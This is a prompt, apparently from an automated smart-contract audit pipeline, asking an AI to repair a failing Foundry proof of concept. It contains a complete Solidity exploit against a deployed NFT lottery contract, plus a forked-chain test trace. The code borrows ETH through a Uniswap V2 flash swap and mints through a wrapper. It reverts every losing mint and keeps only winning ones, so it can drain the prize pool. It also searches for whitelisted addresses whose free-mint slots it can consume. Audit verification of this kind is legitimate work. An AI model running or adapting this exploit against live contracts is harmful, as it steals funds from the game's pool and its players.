You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Contract callers can revert losing mints and keep only winning outcomes
- claim: A wrapper contract can call `freeMint` or `publicMint`, let the mint logic fully determine whether the token is lucky and whether prize ETH was paid, inspect the outcome after the call returns, and revert the outer transaction whenever the outcome is unfavorable. Because a revert rolls back the mint, payment, and whitelist consumption, the attacker can cheaply retry until only profitable outcomes are finalized.
- impact: This turns the lottery into a one-sided option for contract callers. In `publicMint`, the attacker only commits winning mints and loses only gas on failed attempts, allowing extraction from the bonus pool. In `freeMint`, the attacker can repeatedly retry the same whitelist slot until a lucky result appears, then finalize the free NFT plus payout. The bonus pool can be drained and the game becomes economically non-viable.
- exploit_paths: ["Attacker deploys a contract implementing `onERC721Received` and a cheap `receive()` function.", "The wrapper calls `publicMint()` or `freeMint(victim)` and waits for the call to return.", "After return, the wrapper inspects whether the minted token is marked lucky or whether it received the ETH payout.", "If the outcome is losing, the wrapper reverts, rolling back the mint and any whitelist consumption; if the outcome is winning, it does not revert and keeps the NFT/payout."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ILuckyTiger {
    function owner() external view returns (address);
    function withdrawAddress() external view returns (address);
    function pauseMint() external view returns (bool);
    function totalSupply() external view returns (uint256);
    function maxTotal() external view returns (uint256);
    function price() external view returns (uint256);
    function publicMint() external payable;
    function freeMint(address user) external;
    function ownerOf(uint256 tokenId) external view returns (address);
    function isPrize(uint256 tokenId) external view returns (bool);
    function isWhiteList(address user) external view returns (bool);
}

interface IERC721Receiver {
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4);
}

interface IWETH9 {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
    function balanceOf(address user) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier is IERC721Receiver {
    error NotSelfCall();
    error UnexpectedPairCaller(address caller);
    error UnexpectedCallbackSender(address sender);
    error UnluckyOutcome(uint256 tokenId);
    error TokenNotOwned(uint256 tokenId);
    error FlashLoanNotRepaid();
    error MissingRollbackProof();

    ILuckyTiger public constant TARGET = ILuckyTiger(0x9c87A5726e98F2f404cdd8ac8968E9b2C80C0967);
    IWETH9 public constant WETH = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUniswapV2Pair public constant UNISWAP_V2_USDC_WETH =
        IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);

    uint256 private constant FLASH_BPS_DENOMINATOR = 1000;
    uint256 private constant FLASH_BPS_NUMERATOR = 997;

    address public discoveredVictim;
    uint256 public mintedTokenId;
    uint256 private realizedProfit;
    bool public hypothesisValidated;
    bool public rollbackObserved;

    bool private _flashInProgress;
    uint256 private _flashExpectedTokenId;
    uint256 private _flashBorrowAmount;
    uint256 private _flashTargetMints;

    constructor() {}

    function executeOnOpportunity() external {
        if (TARGET.pauseMint()) {
            return;
        }

        uint256 supplyBefore = TARGET.totalSupply();
        if (supplyBefore >= TARGET.maxTotal()) {
            return;
        }

        uint256 wethBefore = WETH.balanceOf(address(this));
        address victim = _findSpendableVictim(supplyBefore);
        discoveredVictim = victim;

        // The vulnerable contract resolves mint luck only from the current block.
        // That keeps the finding's causality intact:
        // - on a losing block, this wrapper proves it can inspect the returned outcome
        //   and revert the outer attempt so the mint / whitelist consumption rolls back;
        // - on a winning block, it finalizes the mint and payout.
        if (!_isLuckyBlock()) {
            if (victim != address(0)) {
                _proveFreeMintRollback(victim, supplyBefore + 1);
            } else {
                _provePublicMintRollback(supplyBefore + 1);
            }

            hypothesisValidated = true;
            _finalizeProfit(wethBefore);
            return;
        }

        if (victim != address(0)) {
            _commitFreeMint(victim, supplyBefore + 1);
            supplyBefore = TARGET.totalSupply();
        }

        if (supplyBefore < TARGET.maxTotal() && address(TARGET).balance >= TARGET.price()) {
            _commitFlashPublicMint(supplyBefore + 1);
        }

        hypothesisValidated = true;
        _finalizeProfit(wethBefore);
    }

    function profitToken() external pure returns (address) {
        return address(WETH);
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfit;
    }

    function attemptFreeMint(address victim, uint256 expectedTokenId) external {
        if (msg.sender != address(this)) revert NotSelfCall();

        TARGET.freeMint(victim);
        _requireWinningOwnership(expectedTokenId);
        mintedTokenId = expectedTokenId;
    }

    function attemptFlashPublicMint(uint256 expectedTokenId, uint256 mintPrice) external {
        if (msg.sender != address(this)) revert NotSelfCall();

        _flashInProgress = true;
        _flashExpectedTokenId = expectedTokenId;
        _flashBorrowAmount = mintPrice;
        _flashTargetMints = 1;

        // v2_flashswap_funding: borrow exactly one mint's WETH from an existing
        // Uniswap V2 pool, unwrap, execute the vulnerable mint, inspect the outcome
        // after return, and deterministically repay only on the winning path.
        UNISWAP_V2_USDC_WETH.swap(0, mintPrice, address(this), abi.encode(expectedTokenId));

        if (_flashInProgress) {
            revert FlashLoanNotRepaid();
        }
    }

    function uniswapV2Call(address sender, uint256, uint256 amount1, bytes calldata) external {
        if (msg.sender != address(UNISWAP_V2_USDC_WETH)) {
            revert UnexpectedPairCaller(msg.sender);
        }
        if (sender != address(this)) {
            revert UnexpectedCallbackSender(sender);
        }
        if (!_flashInProgress) {
            revert FlashLoanNotRepaid();
        }

        uint256 mintPrice = _flashBorrowAmount;
        uint256 expectedTokenId = _flashExpectedTokenId;

        WETH.withdraw(amount1);

        for (uint256 i = 0; i < _flashTargetMints; i++) {
            TARGET.publicMint{value: mintPrice}();
            _requireWinningOwnership(expectedTokenId + i);
            mintedTokenId = expectedTokenId + i;
        }

        uint256 repayment = _flashRepayment(amount1);
        WETH.deposit{value: repayment}();
        if (!WETH.transfer(address(UNISWAP_V2_USDC_WETH), repayment)) {
            revert FlashLoanNotRepaid();
        }

        _flashInProgress = false;
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}

    function _commitFreeMint(address victim, uint256 expectedTokenId) internal {
        try this.attemptFreeMint(victim, expectedTokenId) {
            return;
        } catch {
            revert MissingRollbackProof();
        }
    }

    function _commitFlashPublicMint(uint256 expectedTokenId) internal {
        uint256 mintPrice = TARGET.price();

        try this.attemptFlashPublicMint(expectedTokenId, mintPrice) {
            return;
        } catch {
            revert MissingRollbackProof();
        }
    }

    function _proveFreeMintRollback(address victim, uint256 expectedTokenId) internal {
        uint256 supplyBefore = TARGET.totalSupply();
        bool whitelistBefore = TARGET.isWhiteList(victim);

        try this.attemptFreeMint(victim, expectedTokenId) {
            revert MissingRollbackProof();
        } catch (bytes memory reason) {
            if (!_isUnluckyRevert(reason)) {
                revert MissingRollbackProof();
            }
        }

        if (TARGET.totalSupply() != supplyBefore) {
            revert MissingRollbackProof();
        }
        if (whitelistBefore && !TARGET.isWhiteList(victim)) {
            revert MissingRollbackProof();
        }

        rollbackObserved = true;
    }

    function _provePublicMintRollback(uint256 expectedTokenId) internal {
        uint256 supplyBefore = TARGET.totalSupply();
        uint256 mintPrice = TARGET.price();

        if (address(TARGET).balance < mintPrice) {
            return;
        }

        try this.attemptFlashPublicMint(expectedTokenId, mintPrice) {
            revert MissingRollbackProof();
        } catch (bytes memory reason) {
            if (!_isUnluckyRevert(reason)) {
                revert MissingRollbackProof();
            }
        }

        if (TARGET.totalSupply() != supplyBefore) {
            revert MissingRollbackProof();
        }

        rollbackObserved = true;
    }

    function _requireWinningOwnership(uint256 tokenId) internal view {
        if (!TARGET.isPrize(tokenId)) {
            revert UnluckyOutcome(tokenId);
        }
        if (TARGET.ownerOf(tokenId) != address(this)) {
            revert TokenNotOwned(tokenId);
        }
    }

    function _isLuckyBlock() internal view returns (bool) {
        uint256 random = uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp)));
        return random % 2 == 1;
    }

    function _findSpendableVictim(uint256 supplyBefore) internal view returns (address) {
        address[4] memory obviousCandidates = [TARGET.owner(), TARGET.withdrawAddress(), address(TARGET), address(this)];

        for (uint256 i = 0; i < obviousCandidates.length; i++) {
            if (_isSpendableWhitelistVictim(obviousCandidates[i])) {
                return obviousCandidates[i];
            }
        }

        address[] memory seenHolders = new address[](supplyBefore);
        uint256 seenCount;

        for (uint256 tokenId = 1; tokenId <= supplyBefore; tokenId++) {
            address holder;
            try TARGET.ownerOf(tokenId) returns (address owner_) {
                holder = owner_;
            } catch {
                continue;
            }

            if (holder == address(0) || _seen(seenHolders, seenCount, holder)) {
                continue;
            }

            seenHolders[seenCount] = holder;
            seenCount++;

            if (_isSpendableWhitelistVictim(holder)) {
                return holder;
            }
        }

        return address(0);
    }

    function _isSpendableWhitelistVictim(address candidate) internal view returns (bool) {
        return candidate != address(0) && TARGET.isWhiteList(candidate);
    }

    function _flashRepayment(uint256 amount) internal pure returns (uint256) {
        return ((amount * FLASH_BPS_DENOMINATOR) / FLASH_BPS_NUMERATOR) + 1;
    }

    function _finalizeProfit(uint256 wethBefore) internal {
        _wrapAllEth();

        uint256 wethAfter = WETH.balanceOf(address(this));
        realizedProfit = wethAfter > wethBefore ? wethAfter - wethBefore : 0;
    }

    function _wrapAllEth() internal {
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            WETH.deposit{value: ethBalance}();
        }
    }

    function _isUnluckyRevert(bytes memory reason) internal pure returns (bool) {
        if (reason.length < 4) {
            return false;
        }

        bytes4 selector;
        assembly {
            selector := mload(add(reason, 0x20))
        }
        return selector == UnluckyOutcome.selector;
    }

    function _seen(address[] memory values, uint256 count, address value) internal pure returns (bool) {
        for (uint256 i = 0; i < count; i++) {
            if (values[i] == value) {
                return true;
            }
        }
        return false;
    }
}

```

forge stdout (tail):
```
taticcall]
    │   │   └─ ← [Return] 0xd0128ABc13D4D27E291Cab58fA9C4A97e7ea2853
    │   ├─ [3927] 0x9c87A5726e98F2f404cdd8ac8968E9b2C80C0967::ownerOf(211) [staticcall]
    │   │   └─ ← [Return] 0xd0128ABc13D4D27E291Cab58fA9C4A97e7ea2853
    │   ├─ [674] 0x9c87A5726e98F2f404cdd8ac8968E9b2C80C0967::totalSupply() [staticcall]
    │   │   └─ ← [Return] 211
    │   ├─ [2474] 0x9c87A5726e98F2f404cdd8ac8968E9b2C80C0967::price() [staticcall]
    │   │   └─ ← [Return] 10000000000000000 [1e16]
    │   ├─ [213659] FlawVerifier::attemptFlashPublicMint(212, 10000000000000000 [1e16])
    │   │   ├─ [121482] 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc::swap(0, 10000000000000000 [1e16], FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x00000000000000000000000000000000000000000000000000000000000000d4)
    │   │   │   ├─ [27962] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 10000000000000000 [1e16])
    │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │        topic 1: 0x000000000000000000000000b4e16d0168e52d35cacd2c6185b44281ec28c9dc
    │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000000002386f26fc10000
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [79756] FlawVerifier::uniswapV2Call(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0, 10000000000000000 [1e16], 0x00000000000000000000000000000000000000000000000000000000000000d4)
    │   │   │   │   ├─ [9202] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::withdraw(10000000000000000 [1e16])
    │   │   │   │   │   ├─ [62] FlawVerifier::receive{value: 10000000000000000}()
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   ├─  emit topic 0: 0x7fcf532c15f0a6db0bd6d0e038bea71d30d808c7d98cb3bf7268a95bf5081b65
    │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000000002386f26fc10000
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [59837] 0x9c87A5726e98F2f404cdd8ac8968E9b2C80C0967::publicMint{value: 10000000000000000}()
    │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │        topic 1: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │        topic 3: 0x00000000000000000000000000000000000000000000000000000000000000d4
    │   │   │   │   │   │           data: 0x
    │   │   │   │   │   ├─ [498] FlawVerifier::onERC721Received(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x0000000000000000000000000000000000000000, 212, 0x)
    │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   │   ├─  emit topic 0: 0x6dd0b1196e80c465d51f2d7a9488c932354b5b80e48a0e074a1e964081efcc90
    │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000000000000000d40000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [1423] 0x9c87A5726e98F2f404cdd8ac8968E9b2C80C0967::isPrize(212) [staticcall]
    │   │   │   │   │   └─ ← [Return] false
    │   │   │   │   └─ ← [Revert] UnluckyOutcome(212)
    │   │   │   └─ ← [Revert] UnluckyOutcome(212)
    │   │   └─ ← [Revert] UnluckyOutcome(212)
    │   ├─ [674] 0x9c87A5726e98F2f404cdd8ac8968E9b2C80C0967::totalSupply() [staticcall]
    │   │   └─ ← [Return] 211
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [274] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [370] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 15403430 [1.54e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifier.uniswapV2Call
  at 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc.swap
  at FlawVerifier.attemptFlashPublicMint
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 704.83ms (260.49ms CPU time)

Ran 1 test suite in 859.04ms (704.83ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 2498962)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
